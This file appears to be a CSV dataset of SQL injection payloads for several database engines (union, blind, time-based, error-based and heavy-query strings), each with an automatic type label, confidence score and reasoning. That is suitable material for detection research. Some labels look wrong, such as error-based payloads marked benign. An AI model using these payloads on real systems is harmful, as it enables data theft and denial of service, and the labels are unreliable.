id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
11,select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
12,"-2111' union all select 1061,1061,1061--",union_based,generic,0.95,"UNION SELECT pattern detected in '-2111' union all select 1061,1...' for data exfiltration",3
13,"1"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.95,Joins on Firebird metadata tables ('domain.domains') detected for heavy query,1
14,"-8060"" ) where 5290 = 5290 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.95,Boolean logic pattern 'where 5290 = 5290 ' detected for blind inference or tautology,3
15,"-5170' ) ) as ovbf where 4833 = 4833 union all select 4833,4833,4833,4833--",boolean_blind,generic,0.95,Boolean logic pattern 'where 4833 = 4833 ' detected for blind inference or tautology,1
16,1' where 5103 = 5103,boolean_blind,generic,0.95,Boolean logic pattern 'where 5103 = 5103' detected for blind inference or tautology,2
17,"-8771"" ) ) union all select 6302,6302,6302,6302,6302#",union_based,generic,0.95,"UNION SELECT pattern detected in '-8771"" ) ) union all select 63...' for data exfiltration",3
18,"1, ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",boolean_blind,mysql,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,2
19,"-1573"" ) union all select 3928,3928,3928,3928--",union_based,generic,0.95,"UNION SELECT pattern detected in '-1573"" ) union all select 3928...' for data exfiltration",3
20,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),2
21,1 ) where 7096 = 7096,boolean_blind,generic,0.95,Boolean logic pattern 'where 7096 = 7096' detected for blind inference or tautology,2
22,-3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#,boolean_blind,oracle,0.95,Boolean logic pattern 'where 9420 = 9420 ' detected for blind inference or tautology,1
23,1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069,time_blind,postgresql,0.95,'pg_sleep()' token confirms PostgreSQL time-based blind injection,2
24,1 where 4787 = 4787,boolean_blind,generic,0.95,Boolean logic pattern 'where 4787 = 4787' detected for blind inference or tautology,2
25,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",benign,generic,0.55,UNCERTAIN: Payload '1' ) and exp ( ~ ( s...' contains SQL keywords but lacks clear attack signals.,1
26,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",union_based,generic,0.95,"UNION SELECT pattern detected in '-4635"" union all select 5087,5...' for data exfiltration",3
27,"1"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.55,"UNCERTAIN: Payload '1"" ) ) or char ( 75 ...' contains SQL keywords but lacks clear attack signals.",1
28,"1%"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,boolean_blind,oracle,0.95,Boolean logic pattern 'and 4386 = utl_inaddr' detected for blind inference or tautology,1
29,"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'isyg' = 'isyg",boolean_blind,sqlite,0.95,Boolean logic pattern 'and 3202 = like ' detected for blind inference or tautology,1
30,"1"" where 2989 = 2989 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,0.95,Boolean logic pattern 'where 2989 = 2989 ' detected for blind inference or tautology,1
31,"-5024%"" or make_set ( 3321 = 7355,7355 ) and ""%"" = """,benign,generic,0.55,"UNCERTAIN: Payload '-5024%"" or make_set ...' contains SQL keywords but lacks clear attack signals.",2
32,"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""suxh"" = ""suxh",union_based,generic,0.95,"UNION SELECT pattern detected in '1"" ) ) ) and row ( 6237,7469 )...' for data exfiltration",1
33,select ( case when ( 2593 = 3592 ) then 2593 else 2593* ( select 2593 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
34,"1 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # couj",benign,generic,0.55,UNCERTAIN: Payload '1 and ( select 2* ( ...' contains SQL keywords but lacks clear attack signals.,1
35,"1%' and make_set ( 8403 = 8403,8899 ) and '%' = '",benign,generic,0.55,UNCERTAIN: Payload '1%' and make_set ( 8...' contains SQL keywords but lacks clear attack signals.,2
36,"1 ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.95,Multiple joins on Oracle metadata tables ('all_users') used as heavy query DoS,1
37,"1%' ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.95,UNION SELECT pattern detected in '1%' ) ) ) union all select nul...' for data exfiltration,3
38,"1'|| ( select 'hdpi' where 5620 = 5620 and make_set ( 8403 = 8403,8899 ) ) ||'",boolean_blind,generic,0.95,Boolean logic pattern 'where 5620 = 5620 ' detected for blind inference or tautology,3
39,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",boolean_blind,mysql,0.95,Boolean logic pattern 'or 8466 = benchmark ' detected for blind inference or tautology,1
40,"-7381' ) ) or elt ( 5882 = 5919,5919 ) and ( ( 'nzri' = 'nzri",benign,generic,0.55,UNCERTAIN: Payload '-7381' ) ) or elt ( ...' contains SQL keywords but lacks clear attack signals.,2
41,"1' ) where 5883 = 5883 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,mssql,0.95,Boolean logic pattern 'where 5883 = 5883 ' detected for blind inference or tautology,3
42,"1' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",boolean_blind,oracle,0.95,Boolean logic pattern 'or 7427 = dbms_pipe' detected for blind inference or tautology,1
43,"-8256"" ) ) ) or 6872 = 6872 and ( ( ( ""lrtu"" = ""lrtu",boolean_blind,generic,0.95,Boolean logic pattern 'or 6872 = 6872 ' detected for blind inference or tautology,3
44,"1' where 3339 = 3339 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",boolean_blind,mysql,0.95,Boolean logic pattern 'where 3339 = 3339 ' detected for blind inference or tautology,1
45,select ( case when ( 2056 = 1917 ) then 2056 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
46,"1%"" ) ) or sleep ( 5 ) #",time_blind,mysql,0.95,'sleep()' function token confirms MySQL/MariaDB time-based blind injection,2
47,"end and ( ( ( ""revx"" = ""revx",benign,generic,0.55,"UNCERTAIN: Payload 'end and ( ( ( ""revx""...' contains SQL keywords but lacks clear attack signals.",2
48,"1%' union all select null,null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1%' union all select null,null...' for data exfiltration",3
49,"1%' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.55,UNCERTAIN: Payload '1%' or char ( 119 ) ...' contains SQL keywords but lacks clear attack signals.,1
50,1%' ) ) rlike sleep ( 5 ) and ( ( '%' = ',boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),2
51,"1"" ) ) as zval where 2255 = 2255 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",boolean_blind,mysql,0.95,Boolean logic pattern 'where 2255 = 2255 ' detected for blind inference or tautology,2
52,"1 ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",boolean_blind,mysql,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,2
53,"1' ) ) as bsvk where 5985 = 5985 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.95,Boolean logic pattern 'where 5985 = 5985 ' detected for blind inference or tautology,2
54,select case when 8867 = 7630 then 1 else null end--,boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
55,-4331 ) as inpx where 9804 = 9804 union all select 9804#,boolean_blind,generic,0.95,Boolean logic pattern 'where 9804 = 9804 ' detected for blind inference or tautology,1
56,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'egnv' like 'egnv",time_blind,mysql,0.95,'benchmark()' function token confirms MySQL compute-heavy time-blind injection,2
57,"1 ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4450 = 4450",heavy_query,postgresql,0.95,"'generate_series' with large range (5,000,000) detected (PostgreSQL DoS)",3
58,"-4596"" union all select 5761#",union_based,generic,0.95,"UNION SELECT pattern detected in '-4596"" union all select 5761#...' for data exfiltration",3
59,"1"" where 5353 = 5353 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,generic,0.95,Boolean logic pattern 'where 5353 = 5353 ' detected for blind inference or tautology,2
60,"-6419 union all select 7008,7008,7008,7008,7008--",union_based,generic,0.95,"UNION SELECT pattern detected in '-6419 union all select 7008,70...' for data exfiltration",3
61,"-9180"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,2
62,-8828 ) ) as ospo where 2141 = 2141 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,boolean_blind,oracle,0.95,Boolean logic pattern 'where 2141 = 2141 ' detected for blind inference or tautology,1
63,"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",boolean_blind,generic,0.95,Boolean logic pattern 'where 1335 = 1335 ' detected for blind inference or tautology,3
64,1'+ ( select 'mdxt' where 2733 = 2733 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,Boolean logic pattern 'where 2733 = 2733 ' detected for blind inference or tautology,2
65,"-5587%' ) or elt ( 1032 = 1032,3623 ) and ( '%' = '",benign,generic,0.55,UNCERTAIN: Payload '-5587%' ) or elt ( 1...' contains SQL keywords but lacks clear attack signals.,2
66,"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'ixix' like 'ixix",boolean_blind,oracle,0.95,Boolean logic pattern 'or 5023 = ctxsys' detected for blind inference or tautology,1
67,"1%"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1%"" ) ) union all select null,...' for data exfiltration",3
68,"-7553%"" or 3571 = 2886",boolean_blind,generic,0.95,Boolean logic pattern 'or 3571 = 2886' detected for blind inference or tautology,3
69,1'|| ( select 'ydvg' from dual where 7108 = 7108,boolean_blind,oracle,0.95,Boolean logic pattern 'where 7108 = 7108' detected for blind inference or tautology,3
70,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gtcb' = 'gtcb",benign,generic,0.55,UNCERTAIN: Payload 'call regexp_substrin...' contains SQL keywords but lacks clear attack signals.,1
71,1'|| ( select 'adoe' from dual where 7662 = 7662,boolean_blind,oracle,0.95,Boolean logic pattern 'where 7662 = 7662' detected for blind inference or tautology,3
72,"-2453"" ) union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",union_based,generic,0.95,"UNION SELECT pattern detected in '-2453"" ) union all select 4520...' for data exfiltration",3
73,1'+ ( select pagd where 2484 = 2484,boolean_blind,generic,0.95,Boolean logic pattern 'where 2484 = 2484' detected for blind inference or tautology,3
74,"1' ) ) as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.95,Boolean logic pattern 'where 7691 = 7691 ' detected for blind inference or tautology,2
75,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",heavy_query,db2,0.95,Joins on DB2 metadata tables ('sysibm.systables') detected for heavy query,1
76,"1'+ ( select hspl where 4530 = 4530 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,Boolean logic pattern 'where 4530 = 4530 ' detected for blind inference or tautology,3
77,"1', ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
78,1 ) ) as cwyb where 3633 = 3633,boolean_blind,generic,0.95,Boolean logic pattern 'where 3633 = 3633' detected for blind inference or tautology,2
79,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union_based,generic,0.95,"UNION SELECT pattern detected in '-9860%"" union all select 6996,...' for data exfiltration",3
80,"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",boolean_blind,generic,0.95,Boolean logic pattern 'where 4575 = 4575 ' detected for blind inference or tautology,3
81,"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",benign,mysql,0.55,UNCERTAIN: Payload '1 ) or ( select 9173...' contains SQL keywords but lacks clear attack signals.,1
82,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""jfgk"" like ""jfgk",heavy_query,firebird,0.95,Joins on Firebird metadata tables ('domain.domains') detected for heavy query,1
83,"-5073"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""kbab"" like ""kbab",boolean_blind,postgresql,0.95,Boolean logic pattern 'or 3440 = cast ' detected for blind inference or tautology,3
84,select ( case when ( 4774 = 1535 ) then 4774 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
85,1' ) ) as hxxm where 3792 = 3792 and sleep ( 5 ) #,boolean_blind,mysql,0.95,Boolean logic pattern 'where 3792 = 3792 ' detected for blind inference or tautology,2
86,1' in boolean mode ) order by 1#,benign,generic,0.8,No definitive SQL injection signals detected in payload: '1' in boolean mode ) order by ...',3
87,"1 ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.95,Multiple joins on MSSQL metadata ('sysusers') detected for heavy query,1
88,"1%"" ) and 8626 = 3626#",boolean_blind,generic,0.95,Boolean logic pattern 'and 8626 = 3626' detected for blind inference or tautology,3
89,"iif ( 5214 = 7412,1,1/0 )",benign,generic,0.8,"No definitive SQL injection signals detected in payload: 'iif ( 5214 = 7412,1,1/0 )...'",3
90,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'nuil' like 'nuil",boolean_blind,oracle,0.95,Boolean logic pattern 'and 6537 = dbms_pipe' detected for blind inference or tautology,1
91,"1' ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.95,Joins on Firebird metadata tables ('domain.domains') detected for heavy query,1
92,1'|| ( select 'rhcv' where 6228 = 6228,boolean_blind,generic,0.95,Boolean logic pattern 'where 6228 = 6228' detected for blind inference or tautology,3
93,select pg_sleep ( 5 ) and ( ( 4382 = 4382,time_blind,postgresql,0.95,'pg_sleep()' token confirms PostgreSQL time-based blind injection,2
94,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'oacz' = 'oacz",benign,generic,0.55,UNCERTAIN: Payload '1' ) ) ) and make_se...' contains SQL keywords but lacks clear attack signals.,2
95,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",union_based,generic,0.95,"UNION SELECT pattern detected in '-6951"" union all select 2518,2...' for data exfiltration",3
96,"1'+ ( select mems where 5091 = 5091 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",boolean_blind,mysql,0.95,Boolean logic pattern 'where 5091 = 5091 ' detected for blind inference or tautology,2
97,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # cqqs",benign,mysql,0.55,UNCERTAIN: Payload '1 or ( select 9173 f...' contains SQL keywords but lacks clear attack signals.,1
98,"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",boolean_blind,sqlite,0.95,Boolean logic pattern 'where 9080 = 9080 ' detected for blind inference or tautology,1
99,"1'+ ( select 'otqy' where 2754 = 2754 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",boolean_blind,mysql,0.95,Boolean logic pattern 'where 2754 = 2754 ' detected for blind inference or tautology,2
100,"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 3626 = 3626",error_based,mysql,0.95,'extractvalue'/'updatexml' XPath error tokens detected (MySQL signature),1
101,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'qcsi' = 'qcsi",boolean_blind,mysql,0.95,Boolean logic pattern 'and 'qcsi' = 'qcsi' detected for blind inference or tautology,2
102,"1 ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 5776 = 5776",benign,generic,0.55,UNCERTAIN: Payload '1 ) ) and ( select 2...' contains SQL keywords but lacks clear attack signals.,1
103,"1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 9401 = 9401",benign,generic,0.55,UNCERTAIN: Payload '1 ) ) ) and ( select...' contains SQL keywords but lacks clear attack signals.,1
104,1 rlike sleep ( 5 ) -- muhp,boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),2
105,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) -- saxs,boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),3
106,1 ) as ratg where 3033 = 3033 union all select null--,boolean_blind,generic,0.95,Boolean logic pattern 'where 3033 = 3033 ' detected for blind inference or tautology,1
107,-7404' where 1536 = 1536 order by 1#,boolean_blind,generic,0.95,Boolean logic pattern 'where 1536 = 1536 ' detected for blind inference or tautology,2
108,"1' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,"UNION SELECT pattern detected in '1' ) union all select null,nul...' for data exfiltration",3
109,1 ) as cinw where 3732 = 3732 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,Boolean logic pattern 'where 3732 = 3732 ' detected for blind inference or tautology,2
110,"1 union all select null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1 union all select null,null,n...' for data exfiltration",3
111,1' ) as rhvm where 1420 = 1420,boolean_blind,generic,0.95,Boolean logic pattern 'where 1420 = 1420' detected for blind inference or tautology,2
112,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'edcm' like 'edcm",heavy_query,mssql,0.95,Multiple joins on MSSQL metadata ('sysusers') detected for heavy query,1
113,-2756' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,boolean_blind,oracle,0.95,Boolean logic pattern 'where 6156 = 6156 ' detected for blind inference or tautology,2
114,1' ) union all select null#,union_based,generic,0.95,UNION SELECT pattern detected in '1' ) union all select null#...' for data exfiltration,3
115,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) +'",time_blind,mysql,0.95,'benchmark()' function token confirms MySQL compute-heavy time-blind injection,2
116,"-4711' in boolean mode ) union all select 8007,8007,8007,8007,8007,8007--",union_based,generic,0.95,UNION SELECT pattern detected in '-4711' in boolean mode ) union...' for data exfiltration,3
117,"1%"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,boolean_blind,postgresql,0.95,Boolean logic pattern 'and 2853 = cast ' detected for blind inference or tautology,3
118,"-8129' ) ) ) union all select 4531,4531,4531#",union_based,generic,0.95,UNION SELECT pattern detected in '-8129' ) ) ) union all select ...' for data exfiltration,3
119,"1"" ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,"UNION SELECT pattern detected in '1"" ) union all select null,nul...' for data exfiltration",3
120,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,generic,0.95,Boolean logic pattern 'and 4241 = convert ' detected for blind inference or tautology,3
121,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 3770 = 3770",boolean_blind,firebird,0.95,Boolean logic pattern 'and ( 3770 = 3770' detected for blind inference or tautology,3
122,1' ) as gogu where 4338 = 4338 union all select null#,boolean_blind,generic,0.95,Boolean logic pattern 'where 4338 = 4338 ' detected for blind inference or tautology,1
